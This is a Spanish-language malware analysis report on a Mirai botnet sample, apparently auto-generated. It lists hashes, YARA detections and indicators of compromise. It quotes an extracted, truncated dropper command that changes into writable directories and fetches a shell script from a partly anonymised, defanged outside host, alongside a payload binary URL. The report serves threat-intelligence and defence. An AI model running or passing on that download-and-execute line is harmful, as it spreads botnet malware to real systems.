# 🧬 Payload Analysis

`7ffb5289d2eaef8369340c0628cfba7f1026250c4fb585ef71d304c610077acb`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se registraron 2 detecciones YARA válidas. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Alta`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:34:01+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `7ffb5289d2eaef8369340c0628cfba7f1026250c4fb585ef71d304c610077acb`
- **MD5:** `257a9edfc40a82643f5e32e23e186793`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | data |
| Tamaño | 4.0 KiB |
| Entropía | 5.36 |
| Strings | 68 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- YARA match: mirai
- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=data; iocs=6

## 🖥️ Comandos observados / extraídos

```text
[4hroot@db12-web01:~# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91.92.42.XXX/phantom.sh; curl -
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 91.92.42.XXX | static_analysis |
| url | hxxp://91.92.42.XXX/bins/phantom.x86 | strings |
| url | hxxp://91.92.42.XXX/phantom.sh | strings |
| url | hxxp://91.92.42.XXX/phantom.sh; | strings |
| hash | 7ffb5289d2eaef8369340c0628cfba7f1026250c4fb585ef71d304c610077acb | static_analysis |
| command | [4hroot@db12-web01:~# cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://91.92.42.XXX/phantom.sh; curl - | strings |
| ip | [internal-ip-redacted] | artifact_source |

## 🧬 Detecciones YARA

| Regla | Familia | Severidad | Confianza |
| --- | --- | --- | --- |
| Suspicious_BusyBox_Mirai |  | medium | medium |
| Suspicious_Shell_Script |  | medium | medium |

Detalle completo: [`detections.md`](detections.md).

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
